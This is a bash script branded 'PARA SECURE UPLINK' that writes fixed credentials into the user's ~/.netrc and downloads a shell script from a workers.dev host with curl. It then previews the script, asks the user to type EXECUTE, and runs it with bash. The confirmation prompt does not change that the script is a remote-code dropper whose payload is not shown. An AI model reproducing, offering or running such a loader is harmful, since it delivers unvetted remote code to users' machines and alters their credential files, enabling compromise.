```bash
#!/usr/bin/env bash
# ==========================================================
# PARA SECURE UPLINK
# Professional Remote Payload Gateway
# Redesigned / Re-structured Edition
# ==========================================================

set -Eeuo pipefail

# ----------------------------------------------------------
# PARA TERMINAL THEME
# ----------------------------------------------------------
RED='\033[1;38;5;196m'
GREEN='\033[1;38;5;82m'
GOLD='\033[1;38;5;220m'
CYAN='\033[1;38;5;51m'
PURPLE='\033[1;38;5;141m'
PINK='\033[1;38;5;201m'
WHITE='\033[1;38;5;255m'
GRAY='\033[0;38;5;245m'
BLUE='\033[1;38;5;39m'
RESET='\033[0m'

# ----------------------------------------------------------
# CONNECTION SETTINGS
# ----------------------------------------------------------
REMOTE_HOST="hub.para77710.workers.dev"
REMOTE_URL="https://${REMOTE_HOST}"

PUBLIC_ID="65.0.86.121"
PRIVATE_ID="10.1.0.29"

AUTH_FILE="${HOME}/.netrc"
USER_AGENT="Para-Uplink-Agent/1.0"

DOWNLOAD_FILE="$(mktemp -t para-uplink-XXXXXX.sh)"

cleanup() {
    rm -f "$DOWNLOAD_FILE"
}

trap cleanup EXIT INT TERM

# ----------------------------------------------------------
# BASIC TERMINAL HELPERS
# ----------------------------------------------------------
line() {
    printf '%b\n' "${GRAY}──────────────────────────────────────────────────────────────────────────────${RESET}"
}

ok() {
    printf '%b\n' "${GREEN}✔${RESET} $1"
}

fail() {
    printf '%b\n' "${RED}✖${RESET} $1"
}

info() {
    printf '%b\n' "${CYAN}●${RESET} $1"
}

# ----------------------------------------------------------
# PARA HEADER
# ----------------------------------------------------------
show_header() {
    clear

    printf '%b\n' "${PURPLE}"

    cat <<'BANNER'
██████╗  █████╗ ██████╗  █████╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██████╔╝███████║██████╔╝███████║
██╔═══╝ ██╔══██║██╔══██╗██╔══██║
██║     ██║  ██║██║  ██║██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
BANNER

    printf '%b\n' "${RESET}"

    printf '%b\n' "${PURPLE}╔══════════════════════════════════════════════════════════════════════════════╗${RESET}"
    printf '%b\n' "${PURPLE}║${RESET}              ${PINK}PARA SECURE UPLINK${RESET} ${GRAY}—${RESET} ${GOLD}REMOTE ACCESS GATEWAY${RESET}             ${PURPLE}║${RESET}"
    printf '%b\n' "${PURPLE}║${RESET}              ${GRAY}Protocol:${RESET} ${WHITE}PSU-1${RESET} ${GRAY}|${RESET} ${GREEN}SECURE MODE${RESET} ${GRAY}|${RESET} ${GRAY}$(date '+%Y-%m-%d %H:%M:%S')${RESET}       ${PURPLE}║${RESET}"
    printf '%b\n' "${PURPLE}╚══════════════════════════════════════════════════════════════════════════════╝${RESET}"

    printf '\n%b\n' "${GOLD}                 ★ PARA REMOTE UPLINK READY ★${RESET}"
}

# ----------------------------------------------------------
# ENVIRONMENT CHECK
# ----------------------------------------------------------
verify_environment() {
    line
    printf '%b\n' "${CYAN} NETWORK ENVIRONMENT${RESET}"

    printf '%b\n' "${GRAY} ├─ Public Identifier :${RESET} ${WHITE}${PUBLIC_ID}${RESET}"
    printf '%b\n' "${GRAY} ├─ Private Identifier:${RESET} ${WHITE}${PRIVATE_ID}${RESET}"
    printf '%b\n' "${GRAY} ├─ Remote Host       :${RESET} ${WHITE}${REMOTE_HOST}${RESET}"
    printf '%b\n' "${GRAY} ├─ Endpoint          :${RESET} ${WHITE}${REMOTE_URL}${RESET}"
    printf '%b\n' "${GRAY} └─ Transport         :${RESET} ${GREEN}HTTPS${RESET}"

    if ! command -v curl >/dev/null 2>&1; then
        fail "curl is not installed."
        exit 1
    fi

    ok "Required network utility detected."
}

# ----------------------------------------------------------
# NETRC CONFIGURATION
# ----------------------------------------------------------
configure_auth() {
    printf '\n%b\n' "${GOLD}[ 1 / 2 ] AUTHENTICATION SETUP${RESET}"

    printf '%b' "${GRAY} ├─ Preparing credential store... ${RESET}"

    touch "$AUTH_FILE"
    chmod 600 "$AUTH_FILE"

    # Remove only the existing machine entry.
    # The host is escaped before being passed to sed.
    escaped_host="$(printf '%s' "$REMOTE_HOST" | sed 's/[.[\*^$()+?{|\\]/\\&/g')"

    sed -i "/^[[:space:]]*machine[[:space:]]\+${escaped_host}[[:space:]]/d" \
        "$AUTH_FILE" 2>/dev/null || true

    # Preserve the original authentication fields.
    printf 'machine %s login %s password %s\n' \
        "$REMOTE_HOST" \
        "$PUBLIC_ID" \
        "$PRIVATE_ID" >> "$AUTH_FILE"

    chmod 600 "$AUTH_FILE"

    printf '%b\n' "${GREEN}DONE${RESET}"
    ok "Credential file protected with mode 600."
}

# ----------------------------------------------------------
# REMOTE DOWNLOAD
# ----------------------------------------------------------
fetch_payload() {
    printf '\n%b\n' "${GOLD}[ 2 / 2 ] REMOTE UPLINK${RESET}"

    printf '%b' "${GRAY} ├─ Contacting remote endpoint... ${RESET}"

    if curl \
        --fail \
        --silent \
        --show-error \
        --location \
        --connect-timeout 15 \
        --max-time 120 \
        --user-agent "$USER_AGENT" \
        --netrc \
        --output "$DOWNLOAD_FILE" \
        "$REMOTE_URL"; then

        printf '%b\n' "${GREEN}CONNECTED${RESET}"
    else
        printf '%b\n' "${RED}FAILED${RESET}"
        fail "Unable to retrieve the remote resource."
        exit 1
    fi

    if [[ ! -s "$DOWNLOAD_FILE" ]]; then
        fail "The remote endpoint returned an empty file."
        exit 1
    fi

    ok "Remote resource downloaded successfully."
}

# ----------------------------------------------------------
# PAYLOAD INSPECTION
# ----------------------------------------------------------
inspect_payload() {
    line
    printf '%b\n' "${CYAN} PAYLOAD INSPECTION${RESET}"

    local size
    local sha256

    size="$(wc -c < "$DOWNLOAD_FILE" | tr -d ' ')"
    sha256="$(sha256sum "$DOWNLOAD_FILE" | awk '{print $1}')"

    printf '%b\n' "${GRAY} ├─ File size   :${RESET} ${WHITE}${size} bytes${RESET}"
    printf '%b\n' "${GRAY} ├─ SHA-256     :${RESET} ${BLUE}${sha256}${RESET}"

    if command -v file >/dev/null 2>&1; then
        printf '%b\n' "${GRAY} ├─ File type   :${RESET} ${WHITE}$(file -b "$DOWNLOAD_FILE")${RESET}"
    fi

    printf '%b\n' "${GRAY} └─ Local path  :${RESET} ${WHITE}${DOWNLOAD_FILE}${RESET}"

    line

    printf '%b\n' "${GOLD}The downloaded content has NOT been executed automatically.${RESET}"
    printf '%b\n' "${GRAY}Review it before allowing shell execution.${RESET}"
}

# ----------------------------------------------------------
# OPTIONAL CONTENT PREVIEW
# ----------------------------------------------------------
preview_payload() {
    printf '\n%b\n' "${CYAN} PAYLOAD PREVIEW${RESET}"

    if command -v sed >/dev/null 2>&1; then
        printf '%b\n' "${GRAY}Showing the first 80 lines:${RESET}"
        printf '%b\n' "${GRAY}────────────────────────────────────────────────────────${RESET}"

        sed -n '1,80p' "$DOWNLOAD_FILE"

        printf '%b\n' "${GRAY}────────────────────────────────────────────────────────${RESET}"
    fi
}

# ----------------------------------------------------------
# EXPLICIT EXECUTION
# ----------------------------------------------------------
request_execution() {
    printf '\n%b\n' "${GOLD}EXECUTION CONTROL${RESET}"
    printf '%b\n' "${RED}WARNING:${RESET} ${WHITE}The downloaded file is remote shell code.${RESET}"
    printf '%b\n' "${GRAY}It may modify the current system, install software, or execute commands.${RESET}"
    printf '\n'

    read -r -p "Execute this payload now? Type EXECUTE: " approval

    if [[ "$approval" != "EXECUTE" ]]; then
        printf '\n%b\n' "${CYAN}Execution cancelled. Payload remains unexecuted.${RESET}"
        exit 0
    fi

    printf '\n%b\n' "${PINK}Launching approved payload...${RESET}"

    # Explicit user-approved execution.
    bash "$DOWNLOAD_FILE"
}

# ----------------------------------------------------------
# MAIN
# ----------------------------------------------------------
main() {
    show_header

    verify_environment
    configure_auth
    fetch_payload
    inspect_payload
    preview_payload
    request_execution

    line
    printf '%b\n' "${GREEN}✔ PARA UPLINK SESSION COMPLETE${RESET}"
    printf '%b\n' "${GRAY}Credits:${RESET} ${PINK}Para${RESET}"
}

main "$@"
```
